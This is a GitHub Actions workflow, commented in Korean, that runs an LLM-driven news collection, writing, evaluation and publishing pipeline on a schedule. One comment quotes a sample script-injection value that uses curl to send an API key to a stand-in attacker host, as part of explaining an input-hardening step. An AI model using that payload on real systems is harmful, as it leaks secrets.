name: 수집 및 발행

on:
  schedule:
    # 30분마다. 속보성이 이 사이트의 핵심 경쟁력이므로 촘촘하게 돈다.
    # (GitHub Actions 의 cron 은 UTC 기준이며, 부하 상황에 따라 수 분 늦게 실행될 수 있다.)
    - cron: '*/30 * * * *'
  workflow_dispatch:
    inputs:
      limit:
        description: '이번 실행에서 쓸 기사 수'
        required: false
        default: '3'
      force:
        description: '화제성/중복 기준 무시 (true/false)'
        required: false
        default: 'false'

# 동시에 두 번 돌면 같은 뉴스를 두 번 쓰거나 커밋이 충돌한다.
concurrency:
  group: publish
  cancel-in-progress: false

permissions:
  contents: write

jobs:
  publish:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: npm

      - run: npm ci

      # ── 검사 ─────────────────────────────────────────────────────────
      # 이게 없으면 board.ts 의 "테스트가 이 계산을 지킨다"는 주석이 거짓말이 된다.
      # 접힘선 예산과 CSS/TS 경계값 동기화는 여기서만 실제로 검증된다.
      # 커밋이 이 워크플로를 거쳐 배포되므로, 깨진 채로 나가는 걸 여기서 막는다.
      - name: 타입 검사
        run: npx tsc --noEmit

      - name: 테스트
        run: npm test

      # ── 인증 방식 결정 ────────────────────────────────────────────────
      # NVIDIA 를 1순위로 본다. 호출 왕복이 수 초라 Claude CLI(분 단위)보다
      # 한 실행에서 처리하는 기사 수가 크게 차이 난다.
      # 셋 다 없으면 여기서 멈춘다 — 뒤에서 실패하면 원인을 찾기 어렵다.
      - name: 인증 방식 결정
        id: auth
        env:
          NVKEY: ${{ secrets.NVIDIA_API_KEY }}
          OAUTH: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          APIKEY: ${{ secrets.ANTHROPIC_API_KEY }}
        run: |
          if [ -n "$NVKEY" ]; then
            echo "backend=nvidia" >> "$GITHUB_OUTPUT"
            echo "NVIDIA NIM 사용"
          elif [ -n "$OAUTH" ]; then
            echo "backend=cli" >> "$GITHUB_OUTPUT"
            echo "구독 인증(CLAUDE_CODE_OAUTH_TOKEN) 사용"
          elif [ -n "$APIKEY" ]; then
            echo "backend=api" >> "$GITHUB_OUTPUT"
            echo "API 키(ANTHROPIC_API_KEY) 사용"
          else
            echo "::error::NVIDIA_API_KEY, CLAUDE_CODE_OAUTH_TOKEN, ANTHROPIC_API_KEY 중 하나를 저장소 Secret 에 등록하세요."
            exit 1
          fi

      # 구독 방식일 때만 Claude Code CLI 를 설치한다. API 방식에서는 불필요한 설치 시간이다.
      - name: Claude Code 설치
        if: steps.auth.outputs.backend == 'cli'
        run: npm install -g @anthropic-ai/claude-code

      # 단계마다 제한을 둔다.
      #
      # 예전에는 작업 전체 제한(25분)만 있었다. 그러면 한 단계가 남은 시간을 다 먹었을 때
      # 작업이 **취소**되는데, 취소는 continue-on-error 로 못 막는다. 뒤 단계가 통째로
      # 건너뛰어져 방금 쓴 기사가 커밋되지 않고 사라진다 — 실제로 어제부터 네 번 연속
      # 그랬다(개정 단계가 7분 37초 지점에서 잘리고 커밋이 skipped).
      # 단계 제한에 걸리면 그 단계만 실패하고, continue-on-error 가 받아 준다.
      - name: 수집 → 집필 → 발행
        timeout-minutes: 18
        env:
          # NVIDIA NIM (기본)
          NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
          NVIDIA_BASE_URL: ${{ vars.NVIDIA_BASE_URL }}
          NVIDIA_MODEL: ${{ vars.NVIDIA_MODEL }}
          # Claude 구독 방식
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          # Anthropic API 방식
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}

          LLM_BACKEND: ${{ steps.auth.outputs.backend }}
          LLM_MODEL: ${{ vars.LLM_MODEL || 'claude-opus-5' }}

          REDDIT_CLIENT_ID: ${{ secrets.REDDIT_CLIENT_ID }}
          REDDIT_CLIENT_SECRET: ${{ secrets.REDDIT_CLIENT_SECRET }}
          REDDIT_USER_AGENT: ${{ vars.REDDIT_USER_AGENT }}
          NAVER_CLIENT_ID: ${{ secrets.NAVER_CLIENT_ID }}
          NAVER_CLIENT_SECRET: ${{ secrets.NAVER_CLIENT_SECRET }}
          X_BEARER_TOKEN: ${{ secrets.X_BEARER_TOKEN }}
          FACEBOOK_PAGE_TOKEN: ${{ secrets.FACEBOOK_PAGE_TOKEN }}
          FACEBOOK_PAGE_IDS: ${{ vars.FACEBOOK_PAGE_IDS }}

          # 수동 실행 입력은 반드시 env 로 받는다.
          # run: 안에 ${{ }} 로 직접 넣으면 셸이 읽기 전에 문자열이 치환되어,
          # limit 에 `3"; curl attacker/$API_KEY; echo "` 같은 값을 넣는 것만으로
          # 이 스텝의 시크릿을 가진 채 임의 명령이 실행된다(스크립트 인젝션).
          RUN_LIMIT: ${{ github.event.inputs.limit || '3' }}
          RUN_FORCE: ${{ github.event.inputs.force || 'false' }}
        run: |
          case "$RUN_LIMIT" in
            ''|*[!0-9]*) echo "::error::limit 은 숫자여야 합니다 (받은 값: $RUN_LIMIT)"; exit 1 ;;
          esac

          args=(--limit "$RUN_LIMIT")
          [ "$RUN_FORCE" = "true" ] && args+=(--force)

          npx tsx pipeline/cli.ts run "${args[@]}"

      # 방금 낸 기사를 평가해 둔다. 결과는 data/reviews.json 에 쌓이고,
      # 다음 실행의 집필 프롬프트에 '이번에 특히 신경 쓸 것'으로 자동 반영된다.
      # 평가가 실패해도 기사 발행은 이미 끝났으므로 워크플로를 죽이지 않는다.
      - name: 기사 품질 평가
        timeout-minutes: 4
        continue-on-error: true
        env:
          NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
          NVIDIA_BASE_URL: ${{ vars.NVIDIA_BASE_URL }}
          NVIDIA_MODEL: ${{ vars.NVIDIA_MODEL }}
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          LLM_BACKEND: ${{ steps.auth.outputs.backend }}
          LLM_MODEL: ${{ vars.LLM_MODEL || 'claude-opus-5' }}
        run: npx tsx pipeline/cli.ts evaluate

      # 평가만 하고 끝내면 기준 미달 기사가 그대로 남는다.
      #
      # 실제로 그렇게 됐다. 발행 시 개정 루프가 3회 안에 못 살린 기사는 낮은 점수와
      # 근거 없는 주장을 단 채 사이트에 남았고, 자동 발행이 며칠 돌자 평균이
      # 4.61 → 4.48 로 내려가고 없는 수치를 지어낸 기사가 3건 쌓였다
      # ("삼성 300조·SK 100조 투자", "AI 인재 몸값 수억 원대" — 둘 다 자료에 없다).
      # 광고를 붙일 사이트에서 이건 신뢰 문제라 수를 채우는 것보다 우선한다.
      #
      # improve 는 4.5 미만이거나 근거 없는 주장이 있는 기사만 골라 다시 쓴다.
      # 이전 점수보다 나빠지면 되돌리므로 여러 번 돌아도 나빠지지 않는다.
      - name: 기준 미달 기사 개정
        timeout-minutes: 5
        continue-on-error: true
        env:
          NVIDIA_API_KEY: ${{ secrets.NVIDIA_API_KEY }}
          NVIDIA_BASE_URL: ${{ vars.NVIDIA_BASE_URL }}
          NVIDIA_MODEL: ${{ vars.NVIDIA_MODEL }}
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          LLM_BACKEND: ${{ steps.auth.outputs.backend }}
          LLM_MODEL: ${{ vars.LLM_MODEL || 'claude-opus-5' }}
        run: npx tsx pipeline/cli.ts improve

      # 앞에서 무슨 일이 있었든 커밋한다.
      #
      # 기사 파일은 이미 디스크에 있다. 평가나 개정이 실패했다고 그걸 버리면
      # LLM 호출 값을 그대로 태우는 셈이다. if: always() 가 없으면 앞 단계 실패가
      # 곧 기사 유실이 된다.
      - name: 변경 사항 커밋
        if: always()
        run: |
          git config user.name  "ai-news-bot"
          git config user.email "bot@users.noreply.github.com"
          # 개별 경로를 나열하면 아직 생성되지 않은 파일 하나 때문에 git add 가 exit 128 로
          # 죽고, 방금 LLM 을 돌려 만든 기사가 커밋되지 않은 채 워크플로가 실패한다.
          # (data/geeknews-links.json 은 GeekNews 요청이 전부 차단되면 생성되지 않는다.)
          # content/quarantine 을 반드시 포함한다.
          #
          # 빠뜨리면 격리가 CI 에서는 그냥 영구 삭제가 된다 — 파일 이동의 '삭제' 쪽만
          # 커밋되고 옮겨 간 파일은 추적되지 않은 채 러너와 함께 사라진다.
          # "지우지 않고 옮긴다"는 설계가 정작 실제로 도는 유일한 경로에서 거짓이 되고,
          # 판정이 틀렸을 때 되돌릴 방법이 없어진다.
          git add content/posts content/quarantine data || true
          if git diff --staged --quiet; then
            echo "발행할 새 글 없음 — 커밋 생략"
            exit 0
          fi
          count=$(git diff --staged --name-only -- content/posts | wc -l)
          git commit -m "기사 ${count}건 발행 ($(date -u '+%Y-%m-%d %H:%M UTC'))"
          # 30분 주기라 그사이 원격이 앞서 있을 수 있다. rebase 후 push.
          git pull --rebase --autostash origin "${GITHUB_REF_NAME}"
          git push origin "HEAD:${GITHUB_REF_NAME}"
